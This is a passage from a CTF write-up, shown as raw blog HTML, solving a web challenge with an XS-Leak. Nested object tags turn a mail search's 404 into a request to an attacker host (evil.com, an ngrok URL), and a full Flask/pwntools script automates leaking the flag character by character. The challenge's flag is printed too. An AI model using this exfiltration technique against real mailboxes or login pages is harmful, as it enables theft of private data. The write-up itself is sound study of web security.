</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> <span style=color:#b756ff;font-weight:700>not</span> <span style=color:#63c381>&#34;auth&#34;</span> <span style=color:#b756ff;font-weight:700>in</span> <span style=color:#c1abea>request</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>cookies</span> <span style=color:#b756ff;font-weight:700>or</span> <span style=color:#c1abea>request</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>cookies</span>[<span style=color:#63c381>&#34;auth&#34;</span>] <span style=color:#c7bf54>!=</span> <span style=color:#c1abea>user</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>password</span>:
</span></span><span style=display:flex><span>        <span style=color:#c678dd>return</span> <span style=color:#63c381>&#34;Unauthorized&#34;</span>, <span style=color:#d19a66>404</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#c1abea>keyword</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>request</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>args</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>get</span>(<span style=color:#63c381>&#34;search&#34;</span>, <span style=color:#63c381>&#34;&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#c1abea>emails</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>Email</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>query</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>filter_by</span>(<span style=color:#c1abea>user_id</span><span style=color:#c7bf54>=</span><span style=color:#c1abea>user</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>id</span>)<span style=color:#c7bf54>.</span><span style=color:#c1abea>filter</span>(
</span></span><span style=display:flex><span>            (<span style=color:#c1abea>Email</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>subject</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>contains</span>(<span style=color:#c1abea>keyword</span>)) <span style=color:#c7bf54>|</span> (<span style=color:#c1abea>Email</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>body</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>contains</span>(<span style=color:#c1abea>keyword</span>))
</span></span><span style=display:flex><span>        )<span style=color:#c7bf54>.</span><span style=color:#c1abea>all</span>()
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> <span style=color:#b756ff;font-weight:700>not</span> <span style=color:#c1abea>emails</span>:
</span></span><span style=display:flex><span>        <span style=color:#c678dd>return</span> <span style=color:#c1abea>render_template</span>(<span style=color:#63c381>&#34;emails.html&#34;</span>, <span style=color:#c1abea>user</span><span style=color:#c7bf54>=</span><span style=color:#c1abea>user</span>, <span style=color:#c1abea>emails</span><span style=color:#c7bf54>=</span><span style=color:#c1abea>emails</span>), <span style=color:#d19a66>404</span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#c678dd>return</span> <span style=color:#c1abea>render_template</span>(<span style=color:#63c381>&#34;emails.html&#34;</span>, <span style=color:#c1abea>user</span><span style=color:#c7bf54>=</span><span style=color:#c1abea>user</span>, <span style=color:#c1abea>emails</span><span style=color:#c7bf54>=</span><span style=color:#c1abea>emails</span>), <span style=color:#d19a66>200</span>
</span></span></code></pre></td></tr></table></div></div><p>If we provide a search parameter, it will filter the emails by that keyword. If no emails are found, then <code>emails.html</code> is still rendered and returned, but the status code is returned as 404. On the other hand, if any emails contain the keyword, it will return a 200.</p><h3 id=planning>Planning</h3><p>Now, going back to the CSP on <code>auth</code>, we see that we can host iframes from any <code>http</code> domain. This means that <code>http://mail.supersus.corp</code> is also allowed, so we can actually have the admin open up their own mailbox inside of <code>auth</code>.</p><p>However, this doesn&rsquo;t do anything useful, since we can&rsquo;t exfiltrate anything from that iframe. But, combined with the search function, there is a vector to leak the flag.</p><p>For example, consider if we opened an iframe at <code>http://mail.supersus.corp/emails/1?search=ictf{</code>. We know that one of the emails has the flag, so that iframe should return status 200, with that email inside.</p><p>However, if we instead searched for <code>jctf{</code>, no emails should have that string, so the iframe should return status 404 (but it will still have the inner HTML rendered).</p><p>This means that if we can detect the status code from the requested <code>mail</code> domain, we can leak the flag character by character.</p><h3 id=objection>Objection!</h3><p>But how do we go about detecting this status code?</p><ul><li>We can&rsquo;t use <code>onerror</code>, since the <code>sandbox</code> directive and the rest of the CSP stop us from running Javascript.</li><li>We can&rsquo;t really leak the status code from the iframe, since HTML is loaded either way, and the only difference is the status code.</li></ul><p>Going back through the CSP, the object-src directive seems interesting. Why would they allow <code>http</code> and <code>https</code> objects?</p><p>Well, some searching shows us that <code>object</code> tags actually use their children as fallback content if the object fails to load. In this case, failing to load means an error status code, exactly what we want!</p><p>According to <a href=https://www.w3.org/TR/html401/struct/objects.html>w3.org</a>:</p><ul><li>The user agent must first try to render the object. It should not render the element&rsquo;s contents, but it must examine them in case the element contains any direct children that are PARAM elements (see object initialization) or MAP elements (see client-side image maps).</li><li>If the user agent is not able to render the object for whatever reason (configured not to, lack of resources, wrong architecture, etc.), it must try to render its contents.</li></ul><p>So, something like this should work as a very simple 404 detector!</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">3
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#e06c75>object</span> <span style=color:#b3d23c>data</span><span style=color:#c7bf54>=</span><span style=color:#98c379>&#34;http://mail.supersus.corp/emails/1?search=ictf{X&#34;</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#e06c75>object</span> <span style=color:#b3d23c>data</span><span style=color:#c7bf54>=</span><span style=color:#98c379>&#34;https://evil.com&#34;</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#e06c75>object</span>&gt;
</span></span></code></pre></td></tr></table></div></div><p>If we get a ping at <code>evil.com</code>, then we know that the guess we tried to search for was wrong, and we can move on to the next character. If we don&rsquo;t get a ping, then we know that some email must contain that string, so it must be the correct character.</p><p>Now all we need to do is automate this!</p><h3 id=automation>Automation</h3><p>I chose to do this attack using a hybrid webserver that would also handle the admin bot.</p><p>Basically, you just visit <code>/attack</code> with <code>?known=FLAG_SO_FAR</code>. Then, after a few moments, visit <code>/attack-status</code>, and keep refreshing until you only get a few valid characters that didn&rsquo;t ping back.</p><p>Those characters should be the correct characters of the flag, so you can just append them and try again. If there are no valid characters, just delete the last one and try from there.</p><p>Here&rsquo;s the full code, it&rsquo;s pretty long and janky, but it works:</p><p>filename=app.py</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">62
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#c678dd>from</span> <span style=color:#76a9f9>flask</span> <span style=color:#c678dd>import</span> <span style=color:#c1abea>Flask</span>, <span style=color:#c1abea>request</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>from</span> <span style=color:#76a9f9>pwn</span> <span style=color:#c678dd>import</span> <span style=color:#c1abea>remote</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#76a9f9>time</span>
</span></span><span style=display:flex><span><span style=color:#c1abea>app</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>Flask</span>(<span style=color:#c1abea>__name__</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>start</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>time</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>time</span>()
</span></span><span style=display:flex><span><span style=color:#c1abea>alphabet</span> <span style=color:#c7bf54>=</span> <span style=color:#63c381>&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_</span><span style=color:#98c379>{}</span><span style=color:#63c381>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#c1abea>seen</span> <span style=color:#c7bf54>=</span> <span style=color:#ef8383>set</span>(<span style=color:#c1abea>alphabet</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>@app.route</span>(<span style=color:#63c381>&#34;/&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#00b1f7>index</span>():
</span></span><span style=display:flex><span>    <span style=color:#c678dd>return</span> <span style=color:#63c381>&#34;Hello, World!&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>@app.route</span>(<span style=color:#63c381>&#34;/attack-status&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#00b1f7>attack_status</span>():
</span></span><span style=display:flex><span>    <span style=color:#c1abea>msg</span> <span style=color:#c7bf54>=</span> <span style=color:#98c379>f</span><span style=color:#63c381>&#34;&#34;&#34;&lt;h2&gt;It has been </span><span style=color:#98c379>{</span><span style=color:#c1abea>time</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>time</span>() <span style=color:#c7bf54>-</span> <span style=color:#c1abea>start</span><span style=color:#98c379>}</span><span style=color:#63c381> seconds since the attack started.&lt;/h2&gt;
</span></span></span><span style=display:flex><span><span style=color:#63c381>&lt;h3&gt;Characters seen so far:&lt;/h3&gt;
</span></span></span><span style=display:flex><span><span style=color:#63c381>&lt;p&gt;</span><span style=color:#98c379>{</span><span style=color:#63c381>&#34;&#34;</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>join</span>(<span style=color:#ef8383>sorted</span>(<span style=color:#c1abea>seen</span>))<span style=color:#98c379>}</span><span style=color:#63c381>&lt;/p&gt;
</span></span></span><span style=display:flex><span><span style=color:#63c381>&lt;br&gt;
</span></span></span><span style=display:flex><span><span style=color:#63c381>&lt;h3&gt;Valid characters:&lt;/h3&gt;
</span></span></span><span style=display:flex><span><span style=color:#63c381>&lt;p&gt;</span><span style=color:#98c379>{</span><span style=color:#ef8383>list</span>(<span style=color:#ef8383>set</span>(<span style=color:#c1abea>alphabet</span>) <span style=color:#c7bf54>-</span> <span style=color:#c1abea>seen</span>)<span style=color:#98c379>}</span><span style=color:#63c381>&lt;/p&gt;    
</span></span></span><span style=display:flex><span><span style=color:#63c381>&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>return</span> <span style=color:#c1abea>msg</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>@app.route</span>(<span style=color:#63c381>&#34;/ping&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#00b1f7>ping</span>():
</span></span><span style=display:flex><span>    <span style=color:#c678dd>global</span> <span style=color:#c1abea>seen</span>
</span></span><span style=display:flex><span>    <span style=color:#c1abea>c</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>request</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>args</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>get</span>(<span style=color:#63c381>&#34;c&#34;</span>, <span style=color:#63c381>&#34;&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> <span style=color:#c1abea>c</span> <span style=color:#b756ff;font-weight:700>not</span> <span style=color:#b756ff;font-weight:700>in</span> <span style=color:#c1abea>seen</span>:
</span></span><span style=display:flex><span>        <span style=color:#c1abea>seen</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>add</span>(<span style=color:#c1abea>c</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#c678dd>return</span> <span style=color:#63c381>&#34;pong&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>url</span> <span style=color:#c7bf54>=</span> <span style=color:#98c379>b</span><span style=color:#63c381>&#34;http://auth.supersus.corp/?error=&#34;</span>
</span></span><span style=display:flex><span><span style=color:#c1abea>ngrok</span> <span style=color:#c7bf54>=</span> <span style=color:#63c381>&#34;http://26d4-76-143-182-149.ngrok-free.app&#34;</span>
</span></span><span style=display:flex><span><span style=color:#c1abea>known</span> <span style=color:#c7bf54>=</span> <span style=color:#63c381>&#34;ictf{&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c1abea>payload</span> <span style=color:#c7bf54>=</span> <span style=color:#63c381>&#34;&#34;&#34;&lt;object data=&#34;http://mail.supersus.corp/emails/1?search=FLAG&#34;&gt;&lt;object data=&#34;NGROK/ping?c=GUESS&#34;&gt;&lt;/object&gt;&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#00b1f7>urlencode</span>(<span style=color:#c1abea>s</span>):
</span></span><span style=display:flex><span>    <span style=color:#c678dd>return</span> <span style=color:#63c381>&#34;&#34;</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>join</span>([<span style=color:#98c379>f</span><span style=color:#63c381>&#34;%</span><span style=color:#98c379>{</span><span style=color:#ef8383>ord</span>(<span style=color:#c1abea>c</span>)<span style=color:#98c379>:</span><span style=color:#63c381>02x</span><span style=color:#98c379>}</span><span style=color:#63c381>&#34;</span> <span style=color:#c678dd>if</span> <span style=color:#c1abea>c</span> <span style=color:#b756ff;font-weight:700>not</span> <span style=color:#b756ff;font-weight:700>in</span> <span style=color:#c1abea>alphabet</span> <span style=color:#c678dd>else</span> <span style=color:#c1abea>c</span> <span style=color:#c678dd>for</span> <span style=color:#c1abea>c</span> <span style=color:#b756ff;font-weight:700>in</span> <span style=color:#c1abea>s</span>])<span style=color:#c7bf54>.</span><span style=color:#c1abea>encode</span>()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>@app.route</span>(<span style=color:#63c381>&#34;/attack&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#00b1f7>attack</span>():
</span></span><span style=display:flex><span>    <span style=color:#c678dd>global</span> <span style=color:#c1abea>start</span>, <span style=color:#c1abea>seen</span>
</span></span><span style=display:flex><span>    <span style=color:#c1abea>start</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>time</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>time</span>()
</span></span><span style=display:flex><span>    <span style=color:#c1abea>seen</span> <span style=color:#c7bf54>=</span> <span style=color:#ef8383>set</span>()
</span></span><span style=display:flex><span>    <span style=color:#c1abea>guess</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>request</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>args</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>get</span>(<span style=color:#63c381>&#34;known&#34;</span>, <span style=color:#c1abea>known</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#c678dd>for</span> <span style=color:#c1abea>c</span> <span style=color:#b756ff;font-weight:700>in</span> <span style=color:#c1abea>alphabet</span>:
</span></span><span style=display:flex><span>        <span style=color:#c1abea>r</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>remote</span>(<span style=color:#63c381>&#34;amogus-admin-bot.chal.imaginaryctf.org&#34;</span>, <span style=color:#d19a66>1337</span>)
</span></span><span style=display:flex><span>        <span style=color:#c1abea>payload_c</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>payload</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>replace</span>(<span style=color:#63c381>&#34;GUESS&#34;</span>, <span style=color:#c1abea>c</span>)<span style=color:#c7bf54>.</span><span style=color:#c1abea>replace</span>(<span style=color:#63c381>&#34;FLAG&#34;</span>, <span style=color:#c1abea>guess</span> <span style=color:#c7bf54>+</span> <span style=color:#c1abea>c</span>)<span style=color:#c7bf54>.</span><span style=color:#c1abea>replace</span>(<span style=color:#63c381>&#34;NGROK&#34;</span>, <span style=color:#c1abea>ngrok</span>)
</span></span><span style=display:flex><span>        <span style=color:#ef8383>print</span>(<span style=color:#c1abea>c</span>, <span style=color:#c1abea>url</span> <span style=color:#c7bf54>+</span> <span style=color:#c1abea>payload_c</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>encode</span>())
</span></span><span style=display:flex><span>        <span style=color:#c1abea>r</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>sendline</span>(<span style=color:#c1abea>url</span> <span style=color:#c7bf54>+</span> <span style=color:#c1abea>urlencode</span>(<span style=color:#c1abea>payload_c</span>))
</span></span><span style=display:flex><span>        <span style=color:#c1abea>r</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>close</span>()
</span></span><span style=display:flex><span>        <span style=color:#c1abea>time</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>sleep</span>(<span style=color:#d19a66>0.5</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#c678dd>return</span> <span style=color:#98c379>f</span><span style=color:#63c381>&#34;Attack started on </span><span style=color:#98c379>{</span><span style=color:#c1abea>guess</span><span style=color:#98c379>}</span><span style=color:#63c381>. Check &lt;a href=&#39;/attack-status&#39;&gt;attack status&lt;/a&gt; for more info.&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> <span style=color:#c1abea>__name__</span> <span style=color:#c7bf54>==</span> <span style=color:#63c381>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    <span style=color:#c1abea>app</span><span style=color:#c7bf54>.</span><span style=color:#c1abea>run</span>()
</span></span></code></pre></td></tr></table></div></div><p>Anyway, after running for a while, we can generate the final flag <del>ok idk if this is really the full flag, the infra is down so i cant test so this is taken from a writeup</del>:</p><pre tabindex=0><code>ictf{i_guess_the_imposter_leaked_all_our_data_29f1ba23}
</code></pre><p>This was an interesting XS Leak method that I hadn&rsquo;t seen before, and it stumped me during the real CTF. Upsolving was really satisifying.</p><p>I hope you&rsquo;ve enjoyed reading this 2 web writeups! Next time I&rsquo;ll probably be upsolving some rev but who knows 😄.</p></div></div></main></div><script>function handle_open(e){let t=e.target;e.target.tagName==="SUMMARY"&&(t=e.target.querySelector(".code-summary-inner")),t.classList.toggle("open"),t.classList.contains("open")?t.textContent="Click to collapse "+t.textContent.split(" ").slice(3).join(" "):t.textContent="Click to expand "+t.textContent.split(" ").slice(3).join(" ")}let code_divs=document.querySelectorAll("div.highlight"),to_remove=[];for(let e of code_divs){let t="",n=e.previousElementSibling;n.tagName=="P"&&(n=n.textContent,n.startsWith("filename")&&(t=n.split("=")[1].trim(),to_remove.push(e.previousElementSibling)));let s=e.querySelector("pre code"),o=s.textContent.split(`
`).length;if(t!==""||o>10){let n=document.createElement("details"),o=document.createElement("summary"),i=document.createElement("span");i.textContent="Click to expand",t!==""&&(i.textContent+=" "+t,n.setAttribute("id",t)),i.classList.add("code-summary-inner"),o.appendChild(i),o.addEventListener("click",handle_open),o.classList.add("code-summary"),s.classList.add("code-inner"),e.parentNode.insertBefore(n,e),n.appendChild(o),n.appendChild(e),n.classList.add("code-wrapper")}}for(let e of to_remove)e.remove();let anchors=document.querySelectorAll(".postWrapper a");for(let e of anchors)e.host!==window.location.host&&(e.setAttribute("target","_blank"),e.setAttribute("rel","noopener noreferrer"));let headers=document.querySelectorAll(".postWrapper div h1, .postWrapper div h2, .postWrapper div h3, .postWrapper div h4, .postWrappe div h5, .postWrapper div h6");for(let t of headers){let n=t.getAttribute("id"),e=document.createElement("a");e.setAttribute("href","#"+n),e.classList.add("header-link"),e.textContent="#",t.append(e)}</script><footer class=footer>© 2023 flocto, Built with
<a href=https://gohugo.io class=footerLink>Hugo</a> and (an edited)
<a href=https://github.com/LordMathis/hugo-theme-nightfall class=footerLink>Nightfall</a> theme</footer></div></body></html>